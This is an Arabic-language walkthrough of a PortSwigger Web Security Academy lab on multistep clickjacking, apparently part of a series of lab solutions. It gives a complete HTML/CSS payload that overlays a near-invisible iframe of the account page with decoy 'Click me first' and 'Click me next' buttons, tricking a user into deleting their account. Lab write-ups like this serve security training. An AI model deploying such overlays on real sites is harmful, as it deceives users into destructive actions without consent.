# [Multistep clickjacking](https://portswigger.net/web-security/clickjacking/lab-multistep)

## **`الهدف`**
قم بتصميم هجوم `clickjacking` ليخدع المستخدم لحذف حسابه وتأكيد عملية الحذف، وذلك بالضغط على زر `Click me first` ثم `Click me next` الوهميين.
## **`خطوات الحل`**
سنقوم بتسجيل الدخول إلى حساب `wiener:peter` ثم سنجرب حذف الحساب بالضغط على `Delete account` وسنجد ظهور رسالة تأكيد `Are you sure?` مع خيارين `Yes OR No, take me back`.

**`ملاحظة هامة:`** غالبًا إذا أتممت حذف الحساب فسيتلف اللاب ويفشل الحقن، وسيتعين عليك الإنتظار حتى إعادة تعيين اللاب بعد حوالي `20` دقيقة.

بعد ذلك سنقوم بالدخول إلى السيرفر الخاص بنا الذي يوفره اللاب ونضع السكريبت التالي في خانة `Body`.
```html
<style>
	iframe {
		position:relative;
		width:500px;
		height:700px;
		opacity: 0.0001;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:510px;
		left:50px;
		z-index: 1;
	}
   .secondClick {
		top:305px;
		left:210px;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0aad003f03a04731825fce9e00350088.web-security-academy.net/my-account"></iframe>
```
بعد ذلك سنقوم بالدخول إلى السيرفر الخاص بنا الذي يوفره اللاب ونضع السكريبت التالي في خانة `Body`.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب`** [Basic clickjacking with CSRF token protection](./Basic-clickjacking-with-CSRF-token-protection.md)
